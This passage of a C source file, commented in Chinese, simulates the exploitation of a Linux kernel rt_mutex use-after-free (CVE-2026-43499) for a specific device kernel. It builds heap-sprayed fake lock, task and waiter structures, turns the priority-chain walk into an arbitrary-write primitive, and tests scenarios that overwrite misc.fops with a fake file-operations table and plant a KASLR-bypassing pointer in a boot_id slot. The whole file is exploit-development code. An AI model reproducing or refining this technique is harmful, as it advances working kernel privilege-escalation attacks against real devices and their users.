
    lock = rd64(waiter + W_LOCK_OFF);
    printf("  [4] lock = waiter->lock = %016llx (Z? %d)\n", (unsigned long long)lock, lock == Z_ADDR);

    if (!sl_trylock(lock + 0x00)) {
        sl_unlock(task + OFF_TASK_PI_LOCK);
        printf("  [5] trylock(%016llx) FAIL → retry（模型：HANG 检测）\n", (unsigned long long)(lock + 0));
        panic_at(lock, "trylock retry loop (HANG)");
        goto retry;
    }
    printf("  [5] trylock(Z+0x00) OK\n");

    if (lock == orig_lock || rt_mutex_owner(lock) == top_task) {
        printf("  [6] EDEADLK: lock==orig_lock || owner==top_task\n");
        sl_unlock(lock + 0x00);
        ret = -4;
        goto out_unlock_pi;
    }
    printf("  [6] pass: lock != orig_lock, owner(%016llx) != top_task\n",
           (unsigned long long)rt_mutex_owner(lock));

    if (!requeue) {
        sl_unlock(task + OFF_TASK_PI_LOCK);
        put_task_struct(task);
        if (!rt_mutex_owner(lock)) {
            sl_unlock(lock + 0x00);
            return 0;
        }
        task = get_task_struct(rt_mutex_owner(lock));
        sl_lock(task + OFF_TASK_PI_LOCK);
        next_lock = task_blocked_on_lock(task);
        top_waiter = rt_mutex_top_waiter(lock);
        sl_unlock(task + OFF_TASK_PI_LOCK);
        sl_unlock(lock + 0x00);
        if (!next_lock) goto out_put_task;
        goto again;
    }

    prerequeue_top_waiter = rt_mutex_top_waiter(lock);
    printf("  [7] prerequeue_top_waiter = %016llx\n", (unsigned long long)prerequeue_top_waiter);

    /* [7] rt_mutex_dequeue(lock, waiter) ★ 写原语 */
    printf("  [7] rt_mutex_dequeue(%016llx): ", (unsigned long long)waiter);
    rt_mutex_dequeue(lock, waiter);
    printf("done\n");

    wr32(waiter + W_PRIO_OFF, rd32(task + OFF_TASK_PRIO));
    wr64(waiter + W_DEADLINE_OFF, rd64(task + OFF_TASK_DL_DEADLINE));

    rt_mutex_enqueue(lock, waiter);

    sl_unlock(task + OFF_TASK_PI_LOCK);
    put_task_struct(task);

    if (!rt_mutex_owner(lock)) {
        if (prerequeue_top_waiter != rt_mutex_top_waiter(lock)) {
            printf("  [9] owner=0, top changed → wake(%016llx)\n",
                   (unsigned long long)rd64(rt_mutex_top_waiter(lock) + W_TASK_OFF));
            wake_up_process(rd64(rt_mutex_top_waiter(lock) + W_TASK_OFF));
        } else {
            printf("  [9] owner=0, top unchanged → no wake\n");
        }
        sl_unlock(lock + 0x00);
        return 0;
    }

    /* [10] */
    task = get_task_struct(rt_mutex_owner(lock));
    sl_lock(task + OFF_TASK_PI_LOCK);
    printf("  [10] pi_lock(%016llx) held (owner task)\n", (unsigned long long)(task + OFF_TASK_PI_LOCK));

    /* [11] */
    if (waiter == rt_mutex_top_waiter(lock)) {
        printf("  [11] waiter == top → dequeue_pi/enqueue_pi/adjust_prio\n");
        rt_mutex_dequeue_pi(task, prerequeue_top_waiter);
        rt_mutex_enqueue_pi(task, waiter);
        rt_mutex_adjust_prio(task);
    } else if (prerequeue_top_waiter == waiter) {
        printf("  [11] prerequeue == waiter → dequeue_pi/enqueue_pi(新 top)/adjust_prio\n");
        rt_mutex_dequeue_pi(task, waiter);
        waiter = rt_mutex_top_waiter(lock);
        rt_mutex_enqueue_pi(task, waiter);
        rt_mutex_adjust_prio(task);
    } else {
        printf("  [11] nothing changed → pi_waiters 不碰\n");
    }

    /* [12] */
    next_lock = task_blocked_on_lock(task);
    top_waiter = rt_mutex_top_waiter(lock);
    printf("  [12] next_lock = task_blocked_on_lock(owner) = %016llx; top_waiter=%016llx\n",
           (unsigned long long)next_lock, (unsigned long long)top_waiter);

    sl_unlock(task + OFF_TASK_PI_LOCK);
    sl_unlock(lock + 0x00);

    if (!next_lock) {
        printf("  [12] !next_lock → out_put_task\n");
        goto out_put_task;
    }
    if (!detect_deadlock && waiter != top_waiter) goto out_put_task;
    goto again;

out_unlock_pi:
    sl_unlock(task + OFF_TASK_PI_LOCK);
out_put_task:
    put_task_struct(task);
    return ret;
}

/* try_to_take_rt_mutex — rtmutex.c 806-925 */
static int try_to_take_rt_mutex(u64 lock, u64 task, u64 waiter)
{
    mark_rt_mutex_waiters(lock);
    if (rt_mutex_owner(lock)) return 0;
    if (waiter) {
        if (waiter != rt_mutex_top_waiter(lock)) return 0;
        rt_mutex_dequeue(lock, waiter);
    } else {
        if (rd64(lock + 0x08)) {   /* rt_mutex_has_waiters */
            /* task_to_waiter(task).prio vs top_waiter.prio（简化 waiter_less） */
            u64 tw = rt_mutex_top_waiter(lock);
            if (rd32(task + OFF_TASK_PRIO) >= rd32(tw + W_PRIO_OFF)) return 0;
        } else {
            goto takeit;
        }
    }
    sl_lock(task + OFF_TASK_PI_LOCK);
    wr64(task + OFF_TASK_PI_BLOCKED, 0);
    if (rd64(lock + 0x08))
        rt_mutex_enqueue_pi(task, rt_mutex_top_waiter(lock));
    sl_unlock(task + OFF_TASK_PI_LOCK);
takeit:
    wr64(lock + 0x18, (u64)task | (rd64(lock + 0x18) & 1ULL));
    return 1;
}

/* task_blocks_on_rt_mutex — rtmutex.c 927-1015 */
static int task_blocks_on_rt_mutex(u64 lock, u64 waiter, u64 task, int chwalk)
{
    u64 owner = rt_mutex_owner(lock);
    u64 top_waiter = waiter;
    u64 next_lock;
    int chain_walk = 0, res;

    if (owner == task) return -4;

    sl_lock(task + OFF_TASK_PI_LOCK);
    wr64(waiter + W_TASK_OFF, task);
    wr64(waiter + W_LOCK_OFF, lock);
    wr32(waiter + W_PRIO_OFF, rd32(task + OFF_TASK_PRIO));
    wr64(waiter + W_DEADLINE_OFF, rd64(task + OFF_TASK_DL_DEADLINE));

    if (rd64(lock + 0x08))
        top_waiter = rt_mutex_top_waiter(lock);
    rt_mutex_enqueue(lock, waiter);
    wr64(task + OFF_TASK_PI_BLOCKED, waiter);
    sl_unlock(task + OFF_TASK_PI_LOCK);

    if (!owner) return 0;

    sl_lock(owner + OFF_TASK_PI_LOCK);
    if (waiter == rt_mutex_top_waiter(lock)) {
        rt_mutex_dequeue_pi(owner, top_waiter);
        rt_mutex_enqueue_pi(owner, waiter);
        rt_mutex_adjust_prio(owner);
        if (rd64(owner + OFF_TASK_PI_BLOCKED))
            chain_walk = 1;
    } else if (rt_mutex_cond_detect_deadlock(waiter, chwalk)) {
        chain_walk = 1;
    }
    next_lock = task_blocked_on_lock(owner);
    sl_unlock(owner + OFF_TASK_PI_LOCK);

    if (!chain_walk || !next_lock) return 0;

    get_task_struct(owner);
    sl_unlock(lock + 0x00);

    printf("== task_blocks_on_rt_mutex → rt_mutex_adjust_prio_chain(owner=%016llx, chwalk=%d, "
           "orig_lock=%016llx, next_lock=%016llx, orig_waiter=%016llx, top_task=%016llx) ==\n",
           (unsigned long long)owner, chwalk, (unsigned long long)lock,
           (unsigned long long)next_lock, (unsigned long long)waiter, (unsigned long long)task);
    res = rt_mutex_adjust_prio_chain(owner, chwalk, lock, next_lock, waiter, task);

    sl_lock(lock + 0x00);
    return res;
}

/* remove_waiter — 设备漏洞版（current，非 waiter->task；无 NULL 检查） */
static void remove_waiter_vuln(u64 lock, u64 waiter)
{
    u64 cur = g_cur_task;
    bool is_top_waiter = (waiter == rt_mutex_top_waiter(lock));
    u64 owner = rt_mutex_owner(lock);
    u64 next_lock;

    printf("== remove_waiter(vuln): lock=%016llx waiter=%016llx owner=%016llx ==\n",
           (unsigned long long)lock, (unsigned long long)waiter, (unsigned long long)owner);

    sl_lock(cur + OFF_TASK_PI_LOCK);
    rt_mutex_dequeue(lock, waiter);
    wr64(cur + OFF_TASK_PI_BLOCKED, 0);       /* ★ 清 current，不清 waiter->task → UAF 根源 */
    sl_unlock(cur + OFF_TASK_PI_LOCK);

    if (!owner || !is_top_waiter) return;

    sl_lock(owner + OFF_TASK_PI_LOCK);
    rt_mutex_dequeue_pi(owner, waiter);
    if (rd64(lock + 0x08))
        rt_mutex_enqueue_pi(owner, rt_mutex_top_waiter(lock));
    rt_mutex_adjust_prio(owner);
    next_lock = task_blocked_on_lock(owner);
    sl_unlock(owner + OFF_TASK_PI_LOCK);

    if (!next_lock) return;

    get_task_struct(owner);
    sl_unlock(lock + 0x00);
    printf("== remove_waiter → adjust_prio_chain(MIN): owner=%016llx next_lock=%016llx ==\n",
           (unsigned long long)owner, (unsigned long long)next_lock);
    rt_mutex_adjust_prio_chain(owner, RT_MUTEX_MIN_CHAINWALK, lock, next_lock, 0, waiter);
    sl_lock(lock + 0x00);
}

/* rt_mutex_cleanup_proxy_lock — rtmutex.c 1904-1924 */
static bool rt_mutex_cleanup_proxy_lock(u64 lock, u64 waiter)
{
    bool cleanup = false;

    sl_lock(lock + 0x00);
    try_to_take_rt_mutex(lock, g_cur_task, waiter);
    if (rt_mutex_owner(lock) != g_cur_task) {
        remove_waiter_vuln(lock, waiter);
        cleanup = true;
    }
    sl_unlock(lock + 0x00);
    return cleanup;
}

/* __rt_mutex_start_proxy_lock — rtmutex.c 1763-1793 */
static int __rt_mutex_start_proxy_lock(u64 lock, u64 waiter, u64 task)
{
    int ret;
    if (try_to_take_rt_mutex(lock, task, 0))
        return 1;
    ret = task_blocks_on_rt_mutex(lock, waiter, task, RT_MUTEX_FULL_CHAINWALK);
    if (ret && !rt_mutex_owner(lock))
        ret = 0;
    return ret;
}

/* ============ 6. 场景装配 ============ */

typedef struct {
    int pass_no;
    u64 tree_pc;     /* in[0] 写值 */
    u64 tree_right;  /* in[1] */
    u64 tree_left;   /* in[2] 写目标 */
    u64 lock;        /* out[2] waiter->lock（0 → Z_ADDR） */
    u64 task;        /* out[1] waiter->task（0 → INIT_TASK_ADDR） */
} fdset_cfg_t;

static u64 W_t, M_t, O_t, W_st, M_st, O_st, futex, W_fake, O_waiter, M_waiter;

static void dump_z(const char *tag)
{
    printf("  %s:", tag);
    for (u64 off = 0; off <= 0x50; off += 8) {
        if (off % 0x18 == 0) printf("\n    ");
        printf("Z+0x%02llx=%016llx ", (unsigned long long)off,
               (unsigned long long)rd64(Z_ADDR + off));
    }
    printf("\n");
}

/* ============ 6b. 堆喷 fake 页种子（HP 场景, payload.h 布局） ============ */

/* 参数:
 *   w0_prio       fake_w0 树哨兵 prio（正常 120; 错误变体 130）
 *   w0_pi_nonempty=1 → fake_w0 的 pi_tree_entry.pc 置 0（非空节点 → dequeue_pi 走
 *                    rb_erase → NULL/0 解引用 panic; 真实 payload 若留垃圾同此）
 *   empty_tree    =1 → fake_lock->waiters 空树（rb_node=leftmost=0）
 *   fake_usage    fake_task->usage（正常 0x100; 错误变体 0 → [12] put 到 0 崩）
 */
static void seed_heap(int w0_prio, int w0_pi_nonempty, int empty_tree, u32 fake_usage)
{
    u64 L = HEAP_BASE + HEAP_LOCK;
    u64 w0 = HEAP_BASE + HEAP_W0;
    u64 T = HEAP_BASE + HEAP_TASK;
    u64 F = HEAP_BASE + HEAP_FOPS;

    /* fake_lock: rt_mutex（wait_lock / waiters / owner） */
    wr32(L + 0x00, 0);
    if (empty_tree) {
        wr64(L + 0x08, 0);
        wr64(L + 0x10, 0);
    } else {
        wr64(L + 0x08, w0);   /* waiters.rb_node = fake_w0（非空树 ★） */
        wr64(L + 0x10, w0);   /* waiters.rb_leftmost = fake_w0 */
    }
    wr64(L + 0x18, T | 1ULL); /* owner = fake_task | HAS_WAITERS */

    /* fake_w0: 树根哨兵（黑根 pc=1; prio 默认 120 = W 的 prio） */
    wr64(w0 + 0x00, 1);       /* tree.pc = 黑 */
    wr64(w0 + 0x08, 0);       /* tree.right */
    wr64(w0 + 0x10, 0);       /* tree.left */
    if (w0_pi_nonempty)
        wr64(w0 + 0x18, 0);               /* pi.pc=0 → RB_EMPTY_NODE 假 → rb_erase(0x18) 解引用 */
    else
        wr64(w0 + 0x18, w0 + 0x18);       /* pi.pc=self → 空节点 → dequeue_pi no-op */
    wr64(w0 + 0x20, 0);       /* pi.right */
    wr64(w0 + 0x28, 0);       /* pi.left */
    wr64(w0 + 0x30, T);       /* task = fake_task */
    wr64(w0 + 0x38, L);       /* lock = fake_lock */
    wr32(w0 + 0x40, (u32)w0_prio);
    wr64(w0 + 0x48, 0);       /* deadline */

    /* fake_task: usage/prio/pi_lock/pi_waiters/pi_blocked_on */
    wr32(T + OFF_TASK_USAGE, fake_usage);
    wr32(T + OFF_TASK_PRIO, 120);
    wr32(T + OFF_TASK_NORMAL_PRIO, 120);
    wr32(T + OFF_TASK_PI_LOCK, 0);
    wr64(T + OFF_TASK_PI_WAITERS + 0x00, 0);
    wr64(T + OFF_TASK_PI_WAITERS + 0x08, 0);
    wr64(T + OFF_TASK_PI_TOP, INIT_TASK_ADDR);
    wr64(T + OFF_TASK_PI_BLOCKED, 0);      /* → [12] next_lock=0 → out_put_task 干净 */
    wr32(T + OFF_TASK_STATE, 0);

    /* fake_fops 表: [7] 副作用写落在 +0x08(llseek) 槽, read 槽 +0x10 留 0 */
    wr64(F + 0x00, 0);
    wr64(F + 0x08, 0);
    wr64(F + 0x10, 0);
    wr64(F + 0x18, 0);
}

static void dump_heap(const char *tag)
{
    u64 L = HEAP_BASE + HEAP_LOCK, w0 = HEAP_BASE + HEAP_W0;
    u64 T = HEAP_BASE + HEAP_TASK, F = HEAP_BASE + HEAP_FOPS;
    printf("  %s:\n", tag);
    printf("    fake_lock:  rb_node=%016llx leftmost=%016llx owner=%016llx\n",
           (unsigned long long)rd64(L+0x08), (unsigned long long)rd64(L+0x10),
           (unsigned long long)rd64(L+0x18));
    printf("    fake_w0:    pc=%016llx right=%016llx left=%016llx prio=%u\n",
           (unsigned long long)rd64(w0+0x00), (unsigned long long)rd64(w0+0x08),
           (unsigned long long)rd64(w0+0x10), (unsigned)rd32(w0+0x40));
    printf("    fake_task:  usage=%u prio=%u pi_waiters=%016llx pi_blocked=%016llx\n",
           (unsigned)rd32(T+OFF_TASK_USAGE), (unsigned)rd32(T+OFF_TASK_PRIO),
           (unsigned long long)rd64(T+OFF_TASK_PI_WAITERS+0x00),
           (unsigned long long)rd64(T+OFF_TASK_PI_BLOCKED));
    printf("    fake_fops:  +0x08(llseek)=%016llx +0x10(read)=%016llx +0x18(write)=%016llx\n",
           (unsigned long long)rd64(F+0x08), (unsigned long long)rd64(F+0x10),
           (unsigned long long)rd64(F+0x18));
}

/* 装配一趟：O 已阻塞在 cycle_futex（owner=W），W 的 pi_blocked_on=假 waiter，M 准备 FLPI */
static void setup_pass(int p, const fdset_cfg_t *cfg)
{
    W_t   = TASK_W(p);
    M_t   = TASK_M(p);
    O_t   = TASK_O(p);
    W_st  = W_STACK(p);
    M_st  = M_STACK(p);
    O_st  = O_STACK(p);
    futex = FUTEX_LOCK(p);
    W_fake = W_st + WAITER_OFF;
    O_waiter = O_st + OWAITER_OFF;
    M_waiter = M_st + MWAITER_OFF;
    g_cur_task = M_t;

    /* W task: prio 120（v4 语义；假 waiter prio=130 ≠ 120 → requeue=true） */
    wr32(W_t + OFF_TASK_USAGE, 0x100);
    wr32(W_t + OFF_TASK_PRIO, 120);
    wr32(W_t + OFF_TASK_NORMAL_PRIO, 120);
    wr64(W_t + OFF_TASK_PI_BLOCKED, W_fake);   /* UAF：指向 fd_set 假 waiter */
    wr32(W_t + OFF_TASK_STATE, 0);
    /* M task */
    wr32(M_t + OFF_TASK_USAGE, 0x100);
    wr32(M_t + OFF_TASK_PRIO, 120);
    wr32(M_t + OFF_TASK_NORMAL_PRIO, 120);
    wr32(M_t + OFF_TASK_STATE, 0);
    /* O task: prio 139（nice 19） */
    wr32(O_t + OFF_TASK_USAGE, 0x100);
    wr32(O_t + OFF_TASK_PRIO, 139);
    wr32(O_t + OFF_TASK_NORMAL_PRIO, 139);
    wr32(O_t + OFF_TASK_STATE, 0);

    /* cycle_futex rt_mutex: owner=W */
    wr64(futex + 0x18, W_t | 1ULL);            /* HAS_WAITERS */
    /* O 的 waiter：入 cycle_futex.waiters（prio 139）+ W->pi_waiters */
    wr32(O_waiter + W_PRIO_OFF, 139);
    wr64(O_waiter + W_TASK_OFF, O_t);
    wr64(O_waiter + W_LOCK_OFF, futex);
    wr64(O_t + OFF_TASK_PI_BLOCKED, O_waiter);
    RB_CLEAR_NODE(O_waiter + WAITER_TREE_OFF);
    RB_CLEAR_NODE(O_waiter + WAITER_PI_OFF);
    rt_mutex_enqueue(futex, O_waiter);         /* 空树 → root=O_waiter, leftmost=O_waiter */
    rt_mutex_enqueue_pi(W_t, O_waiter);
    wr32(W_t + OFF_TASK_PRIO, 139);            /* O 阻塞提升 W */
    wr64(W_t + OFF_TASK_PI_TOP, O_t);

    /* W 的假 waiter（fd_set，oracle 定案映射） */
    wr64(W_fake + 0x00, cfg->tree_pc);         /* in[0]  tree.pc */
    wr64(W_fake + 0x08, cfg->tree_right);      /* in[1]  tree.right */
    wr64(W_fake + 0x10, cfg->tree_left);       /* in[2]  tree.left */    wr64(W_fake + 0x18, 0);                    /* in[3] pi.pc */
    wr64(W_fake + 0x20, 0);                    /* in[4] pi.right */
    wr64(W_fake + 0x28, 0);                    /* out[0] pi.left */
    wr64(W_fake + W_TASK_OFF, cfg->task ? cfg->task : INIT_TASK_ADDR); /* out[1] task */
    wr64(W_fake + W_LOCK_OFF, cfg->lock ? cfg->lock : Z_ADDR);         /* out[2] lock */
    wr32(W_fake + W_PRIO_OFF, 130);            /* out[3] prio */
    wr64(W_fake + W_DEADLINE_OFF, 0);          /* out[4] deadline */

    printf("--- pass %d: tree_pc=%016llx tree_right=%016llx tree_left=%016llx ---\n",
           p, (unsigned long long)cfg->tree_pc,
           (unsigned long long)cfg->tree_right, (unsigned long long)cfg->tree_left);
    printf("    W_fake(waiter)=%016llx  W_t=%016llx  futex=%016llx\n",
           (unsigned long long)W_fake, (unsigned long long)W_t, (unsigned long long)futex);
}

/* M 的 FLPI(cycle_futex)：完整入口（futex_lock_pi → __rt_mutex_start_proxy_lock） */
static void run_flpi(void)
{
    printf("== M: FUTEX_LOCK_PI(cycle_futex) → futex_lock_pi ==\n");
    sl_lock(futex + 0x00);
    /* M_waiter 初始化（rt_mutex_init_waiter） */
    RB_CLEAR_NODE(M_waiter + WAITER_TREE_OFF);
    RB_CLEAR_NODE(M_waiter + WAITER_PI_OFF);
    wr64(M_waiter + W_TASK_OFF, 0);
    int ret = __rt_mutex_start_proxy_lock(futex, M_waiter, M_t);
    sl_unlock(futex + 0x00);
    if (ret == 1) {
        printf("== M 直接拿到锁（不应发生） ==\n");
    } else if (ret < 0) {
        printf("== M: start_proxy_lock 返回 %d (EDEADLK) → cleanup ==\n", ret);
        rt_mutex_cleanup_proxy_lock(futex, M_waiter);
    } else {
        printf("== M 阻塞在 wait_proxy_lock（probe_done=0 语义）==\n");
    }
}

static void zero_page_reset(void)
{
    memset(pages[0].data, 0, 4096);
    fault_pending = 0;
    fault_addr = 0;
    fault_where = NULL;
}

int main(int argc, char **argv)
{
    const char *sc = argc > 1 ? argv[1] : "SUD";

    /* 内存页面（全局，场景间 Z 保留/重置可控） */
    add_page(Z_ADDR, 4096, 1);                     /* pages[0] = Z */
    add_page(INIT_TASK_ADDR, 4096, 0);
    /* init_task 字段 */
    wr32(INIT_TASK_ADDR + OFF_TASK_USAGE, 0x100);
    wr32(INIT_TASK_ADDR + OFF_TASK_STATE, 0);
    wr32(INIT_TASK_ADDR + OFF_TASK_PRIO, 120);
    for (int p = 0; p < 4; p++) {
        add_page(W_STACK(p), 0x4000, 0);
        add_page(M_STACK(p), 0x4000, 0);
        add_page(O_STACK(p), 0x4000, 0);
        add_page(TASK_W(p), 0x1000, 0);
        add_page(TASK_M(p), 0x1000, 0);
        add_page(TASK_O(p), 0x1000, 0);
        add_page(FUTEX_LOCK(p), 0x1000, 0);
    }

    fdset_cfg_t cfgS = { .tree_pc = 0x0, .tree_right = 0x0, .tree_left = 0x0 };
    fdset_cfg_t cfgU = { .tree_pc = Z_ADDR | 1ULL, .tree_right = 0x0, .tree_left = Z_ADDR + 0x40 };
    fdset_cfg_t cfgD = { .tree_pc = Z_ADDR | 1ULL, .tree_right = 0x0, .tree_left = Z_ADDR + 0x18 };
    fdset_cfg_t cfgD2= { .tree_pc = INIT_TASK_ADDR | 1ULL, .tree_right = 0x0, .tree_left = Z_ADDR + 0x18 };

    /* HP: 堆喷 fake_lock（非空树 + owner=fake_task）; 写形状 tree_pc→*(tree_left) */
    fdset_cfg_t cfgHP = { .tree_pc = HEAP_BASE + HEAP_FOPS,        /* 写值 = fake_fops */
                          .tree_right = 0x0,
                          .tree_left = ALIAS_MISC_FOPS,            /* 写目标 = misc.fops */
                          .lock = HEAP_BASE + HEAP_LOCK,
                          .task = INIT_TASK_ADDR };
    fdset_cfg_t cfgSL = { .tree_pc = ALIAS_LOGGER,                 /* 写值 = logger 别名 */
                          .tree_right = 0x0,
                          .tree_left = ALIAS_BOOT_ID,              /* 写目标 = boot_id 槽 */
                          .lock = HEAP_BASE + HEAP_LOCK,
                          .task = INIT_TASK_ADDR };
    fdset_cfg_t cfgHE = { .tree_pc = HEAP_BASE + HEAP_FOPS,
                          .tree_right = 0x0,
                          .tree_left = ALIAS_MISC_FOPS,
                          .lock = HEAP_BASE + HEAP_LOCK,
                          .task = INIT_TASK_ADDR };
    /* HPdiag: 真机 v10 DIAG 组合 — 写值 = fake_fops(堆), 写目标 = boot_id 槽。
     * 真机该组合写不落盘（boot_id 未变）; 模型若通过则模型与设备机制有差异。 */
    fdset_cfg_t cfgDIAG = { .tree_pc = HEAP_BASE + HEAP_FOPS,
                            .tree_right = 0x0,
                            .tree_left = ALIAS_BOOT_ID,
                            .lock = HEAP_BASE + HEAP_LOCK,
                            .task = INIT_TASK_ADDR };

    /* 堆喷 32KB 块 + 直映射别名区（HP 场景） */
    add_page(HEAP_BASE, 0x8000, 0);
    add_page(DMAP_BASE, 0xc00000, 0);

    printf("CVE-2026-43499 rt_mutex 链遍历状态机模型 (PFEM10 5.10)  scenario=%s\n", sc);

    if (!strcmp(sc, "S")) {
        zero_page_reset();
        setup_pass(0, &cfgS);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出；泄露: Z+0x08=0x%016llx Z+0x10=0x%016llx\n",
                    (unsigned long long)rd64(Z_ADDR+8), (unsigned long long)rd64(Z_ADDR+0x10));
        dump_z("Z after S");
    } else if (!strcmp(sc, "U")) {
        zero_page_reset();
        setup_pass(0, &cfgU);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出；usage 写: Z+0x40=0x%016llx (期望 Z|1)\n", (unsigned long long)rd64(Z_ADDR+0x40));
        dump_z("Z after U");
    } else if (!strcmp(sc, "D")) {
        zero_page_reset();
        setup_pass(0, &cfgD);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s)  ← [10]-[12] 延续在 fresh Z + owner=Z 上\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出；owner 写: Z+0x18=0x%016llx\n", (unsigned long long)rd64(Z_ADDR+0x18));
        dump_z("Z after D");
    } else if (!strcmp(sc, "D2")) {
        zero_page_reset();
        setup_pass(0, &cfgD2);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出；owner 写: Z+0x18=0x%016llx (=init_task|1)  [10]-[12] 延续完成\n",
                    (unsigned long long)rd64(Z_ADDR+0x18));
        dump_z("Z after D2");
    } else if (!strcmp(sc, "SUD")) {
        /* v6 复现：三趟共享 Z */
        zero_page_reset();
        setup_pass(0, &cfgS); run_flpi();
        printf("★ after S: %s\n", fault_pending ? "PANIC" : "clean");
        if (!fault_pending) dump_z("Z after S");
        setup_pass(1, &cfgU); run_flpi();
        printf("★ after U: %s\n", fault_pending ? "PANIC" : "clean");
        if (!fault_pending) dump_z("Z after U");
        setup_pass(2, &cfgD); run_flpi();
        printf("★ after D: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) printf("★ 三趟共享 Z 在 pass %d 崩溃 @ %016llx (%s)\n",
                                  fault_pending ? 2 : 0, (unsigned long long)fault_addr, fault_where);
        else dump_z("Z after D");
    } else if (!strcmp(sc, "SD2")) {
        /* 两趟共享 Z：S(泄露) → D2(owner=init_task 延续)，无需 usage 种子 */
        zero_page_reset();
        setup_pass(0, &cfgS); run_flpi();
        printf("★ after S: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) goto sd2_end;
        setup_pass(1, &cfgD2); run_flpi();
        printf("★ after D2: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) printf("★ S→D2 PANIC @ %016llx (%s)\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ S→D2 干净：[10]-[12] 延续完成 (owner=init_task, usage 0x100→0x101→0x100)\n");
    sd2_end:
        dump_z("Z after SD2");
    } else if (!strcmp(sc, "SUDfresh")) {
        /* 单趟纪律：每趟 fresh Z（模拟每次 boot 重载），看哪些单趟能独立跑 */
        zero_page_reset(); setup_pass(0, &cfgS); run_flpi();
        printf("★ S@fresh: %s\n", fault_pending ? "PANIC" : "clean");
        zero_page_reset(); setup_pass(1, &cfgU); run_flpi();
        printf("★ U@fresh: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) printf("  ↳ 单趟 U 在 [9] wake(NULL) 崩溃（无 S 残留抑制）\n");
        zero_page_reset(); setup_pass(2, &cfgD); run_flpi();
        printf("★ D@fresh: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) printf("  ↳ 单趟 D 在 put_task_struct 崩溃（usage 未种子）\n");
        zero_page_reset(); setup_pass(3, &cfgD2); run_flpi();
        printf("★ D2@fresh: %s\n", fault_pending ? "PANIC" : "clean");
        if (fault_pending) printf("  ↳ 单趟 D2 在 [11] dequeue_pi(NULL) 崩溃（空树 → waiter 成 top）\n");
    } else if (!strcmp(sc, "HP")) {
        /* 堆喷 fake_lock 单趟：FOPS 写形状, 非空树 + owner=fake_task → [10]-[12] 延续干净 */
        seed_heap(120, 0, 0, 0x100);
        setup_pass(0, &cfgHP);
        run_flpi();
        if (fault_pending) {
            printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        } else {
            printf("★ 干净退出：misc.fops = 0x%016llx (期望 %016llx)\n",
                   (unsigned long long)rd64(ALIAS_MISC_FOPS),
                   (unsigned long long)(HEAP_BASE + HEAP_FOPS));
            printf("  [7] 副作用: fake_fops+0x08(llseek) = 0x%016llx\n",
                   (unsigned long long)rd64(HEAP_BASE + HEAP_FOPS + 0x08));
            printf("  [7] 树: rb_node=%016llx leftmost=%016llx (期望 fake_w0)\n",
                   (unsigned long long)rd64(HEAP_BASE + HEAP_LOCK + 0x08),
                   (unsigned long long)rd64(HEAP_BASE + HEAP_LOCK + 0x10));
            printf("  [10/12] fake_task usage = 0x%x (期望 0x100 往返)\n",
                   (unsigned)rd32(HEAP_BASE + HEAP_TASK + OFF_TASK_USAGE));
        }
        dump_heap("heap after HP");
    } else if (!strcmp(sc, "HPslide")) {
        /* SLIDE 写形状：boot_id 槽 = logger 别名（KASLR 无关直映射） */
        seed_heap(120, 0, 0, 0x100);
        setup_pass(0, &cfgSL);
        run_flpi();
        if (fault_pending) {
            printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        } else {
            printf("★ 干净退出：boot_id 槽 = 0x%016llx (期望 %016llx)\n",
                   (unsigned long long)rd64(ALIAS_BOOT_ID),
                   (unsigned long long)ALIAS_LOGGER);
            printf("  [7] 副作用: ALIAS_LOGGER+0x08 = 0x%016llx\n",
                   (unsigned long long)rd64(ALIAS_LOGGER + 0x08));
        }
        dump_heap("heap after HPslide");
    } else if (!strcmp(sc, "HPempty")) {
        /* 空树：prerequeue=0 → [11] 分支1 dequeue_pi(fake_task, NULL) → 0 解引用 */
        seed_heap(120, 0, 1, 0x100);
        setup_pass(0, &cfgHE);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s) ← 空树 [11] dequeue_pi(NULL)\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出（不应发生）\n");
        dump_heap("heap after HPempty");
    } else if (!strcmp(sc, "HPdiag")) {
        /* 真机 v10 DIAG: 写值=fake_fops(堆), 写目标=boot_id 槽 — 设备实测写不落盘 */
        seed_heap(120, 0, 0, 0x100);
        setup_pass(0, &cfgDIAG);
        run_flpi();
        if (fault_pending) {
            printf("★ PANIC @ %016llx (%s)\n", (unsigned long long)fault_addr, fault_where);
        } else {
            printf("★ 干净退出：boot_id 槽 = 0x%016llx (期望 fake_fops %016llx)\n",
                   (unsigned long long)rd64(ALIAS_BOOT_ID),
                   (unsigned long long)(HEAP_BASE + HEAP_FOPS));
            printf("  写值=堆地址属性: 模型与设备差异点 [%s]\n",
                   rd64(ALIAS_BOOT_ID) == (HEAP_BASE + HEAP_FOPS)
                   ? "模型也写入 → 机制不在此" : "模型也不写入 → 机制定位");
        }
        dump_heap("heap after HPdiag");
    } else if (!strcmp(sc, "HPw0hi")) {
        /* fake_w0 prio=130：enqueue 插左抢走 leftmost → [11] 分支1 触碰 pi_waiters,
         * fake_w0 pi 节点非空(0) → dequeue_pi → rb_erase(0x18) 0 解引用 */
        seed_heap(130, 1, 0, 0x100);
        setup_pass(0, &cfgHP);
        run_flpi();
        if (fault_pending) printf("★ PANIC @ %016llx (%s) ← w0hi [11] dequeue_pi 0 解引用\n",
                                  (unsigned long long)fault_addr, fault_where);
        else printf("★ 干净退出（pi 节点空种子时不会崩, 但 pi_waiters 已被污染 — 仍属错误形状）\n");
        dump_heap("heap after HPw0hi");
    } else if (!strcmp(sc, "HPusage0")) {
        /* fake_task usage=0：[12] put → 0 → __put_task_struct(free 垃圾) panic */
